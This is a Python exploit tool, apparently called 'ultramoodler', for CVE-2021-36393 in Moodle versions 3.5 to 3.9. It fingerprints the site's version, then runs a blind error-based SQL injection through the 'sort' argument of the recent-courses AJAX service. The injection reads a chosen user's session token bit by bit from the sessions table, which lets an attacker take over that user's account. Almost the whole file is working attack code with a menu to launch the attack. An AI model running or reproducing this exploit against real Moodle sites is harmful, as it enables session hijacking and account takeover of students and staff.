import os
import base64
import requests
import re
import time

from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
try:
    from getch import getch
except ImportError:
    try:
        from msvcrt import getch
    except ImportError:
        def getch():
            return input("key: ")


def water_horizontal(text):
    faded = ""
    down = True

    i = 0
    for line in text.splitlines():
        green = 255
        for character in line:
            increment = 255 // (len(line) // 2)
            if i == len(line) // 2:
                down = False
            i += 1
            if down:
                green -= increment
            else:
                green += increment

            if green > 254:
                green = 255
            elif green < 1:
                green = 30

            faded += (f"\033[38;2;0;{green};220m{character}\033[0m")
    return faded

def print_cool(text, end='\n'):
    print(water_horizontal("[#] " + str(text)), end=end)

def input_cool(text):
    return input(water_horizontal("[>>] " + text))
    
def water_vertical(text):
    green = 255
    currentline = 0
    down = True

    linecount = len(text.splitlines())
    for line in text.splitlines():
        if currentline == linecount // 2:
            down = False
        print(f"\033[38;2;0;{green};255m{line}\033[0m")
        green += -50 if down else 50
        currentline += 1


def print_menu():
    some_cool_guy = base64.b64decode('QDB4a2FzcGVy').decode('utf-8')
    cwe = base64.b64decode('Q1ZFLTIwMjEtMzYzOTM=').decode('utf-8')

    logo = f"""
                    .,;cd0XXXXXXXXXXKOdc'.    {water_horizontal(f'-=-= ultramoodler {cwe} -=-=')}
                .,cdOXXNNXXXXNNXKOdc'.        {water_horizontal(f'special thanks to {some_cool_guy}')}
            .,cdOXXNNNXNNNXXKOdc'.            {water_horizontal('for finding this exploit')}
        ,,;cdOXXXXKOxddddddo:'.
    ':dOKXXNNNXXXXX0xc,..                     {water_horizontal(f'1) Test if moodle instance is vulnerable to {cwe}')}
    .,cdOXXXNNXXNNXK0Odc'.                    {water_horizontal(f'2) Launch {cwe} attack')}
        .,cdOKXNNXXXNNNXKOdc'.                {water_horizontal('3) Exit')} 
            .ckKAXAXAXXXXXXXKx:.             
            """

    string = water_horizontal(("=" * 33) + "discord.gg/zsl" + ("=" * 33))
    print(string)
    water_vertical(logo)


session = requests.Session()
session.headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'pragma': 'no-cache',
    'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'cross-site',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
}
session.verify = False # it doesn't work with localhost without this


def versiontuple(v):
    return tuple(map(int, (v.split("."))))


def input_url():
    url = input_cool("Enter moodle website url: ")
    if not url:
        print("URL was not specified!")
        input_url()

    req = None
    try:
        req = session.get(url + '/question/upgrade.txt')
    except (requests.exceptions.MissingSchema, requests.exceptions.InvalidURL):
        print("Invalid URL!")
        input_url()

    if req.status_code != 200:
        print("Error when requesting /question/upgrade.txt: " + str(req.status_code))
        return

    versions = re.findall(r"===\ (...)\ ==", req.text)
    if len(versions) == 0:
        print("Error: couldn't find any moodle versions!")
        return

    version = versiontuple(versions[0])
    if version > versiontuple("3.9") or version < versiontuple("3.5"):
        print("Warning: Version may not be vulnerable:", versions[0])
        return

    print_cool("Version is vulnerable: " + str(versions[0]))
    return url

def do_exploit(url):
    sesskey = input_cool("Session key: ")
    cookie = input_cool("MoodleSession cookie: ")
    self_uid = input_cool("Self user id: ")
    uid = input_cool("Target user id (must be online within last few hours): ")
    table_prefix = input_cool("Table prefix (probably mdl): ")

    def check(sort):
        return session.post(url + '/lib/ajax/service.php', params={
            'sesskey': sesskey,
            'info': 'core_course_get_recent_courses',
        }, cookies={'MoodleSession': cookie}, json=[{
            'index': 0,
            'methodname': 'core_course_get_recent_courses',
            'args': {
                "userid": self_uid,
                "sort": sort
            }
        }])
    
    test = check("")
    if test.status_code != 200:
        print("Test request failed:",test.status_code)
        print(test.text)

    if test.json()[0]["error"]:
        code = test.json()[0]["exception"]["errorcode"]
        if code == 'servicerequireslogin':
            print("Invalid MoodleSession cookie specified.")
        elif code == 'invalidsesskey':
            print("Invalid session key specified.")
        else:
            print("Unknown moodle error:", test.json()[0]["exception"])
        return
    if len(test.json()[0]["data"]) == 0:
        print("Couldn't find any recent enrolled courses. This exploit won't work :C")
        print("Or maybe you specified wrong self user id...")
        return
    print_cool("First check passed - found some recent enrolled courses")

    test = check("sus")
    if test.json()[0]["exception"]["errorcode"] != "dmlreadexception":
        print("Unexpected error, should be dmlreadexception:", test.json()[0])
        return
    print_cool("Second check passed - this moodle instance is vulnerable")

    def check_error(sort):
        return check(sort).json()[0]['error']

    if check_error(f'1, (SELECT 1 FROM {table_prefix}_sessions LIMIT 1)'):
        print("Error, probably this moodle instance has different table prefix than mdl")
        return
    print_cool("Third check passed - found mdl_sessions table")

    if check_error(
        f'1, (select case when (SELECT 1 FROM {table_prefix}_sessions WHERE userid={uid} GROUP by id DESC LIMIT 1) then 1 else 1*(select table_name from information_schema.tables)end)=1;'): 
        print("Error, couldn't find specified target user id in sessions table.")
        return
    print_cool(f"4th check passed - user with id {uid} exists")

    def decode_single_char(index):
        index = index + 1

        bits = ""
        for div in range(0, 8):
            err = check_error(
                f'1, (select case when (SELECT MOD(ASCII(SUBSTRING(sid, {index}, 1)) DIV {2**div}, 2) FROM {table_prefix}_sessions WHERE userid={uid} GROUP by id DESC LIMIT 1) then 1 else 1*(select table_name from information_schema.tables)end)=1;')
            bits += "0" if err else "1"

        return chr(int(bits[::-1], 2))

    start = time.time()

    print_cool("token: ", end='')

    i = 0
    while True:
        c = decode_single_char(i)
        if c == '\00':
            break
        print(c, end='', flush=True)
        i += 1

    print()
    print_cool(f"took {str(time.time() - start)[:4]}s")
  
if __name__ == "__main__":
    os.system("")
    print("\033[1;43mWarning: this script is running without proxies by default. Use at your own risk.\033[0;0m")
    print("\033[1;43mPress q to exit the program, or any other to continue...\033[0;0m")

    if getch() == b'q':
        exit(1)

    print_menu()

    try:
        while True:
            choice = getch()
            if choice == b'1':
                url = input_url()
                exit(0)
            elif choice == b'2':
                do_exploit(input_url())
                exit(0)
            elif choice == b'3' or choice == b'\x03':
                exit(1)
    except KeyboardInterrupt:
        pass
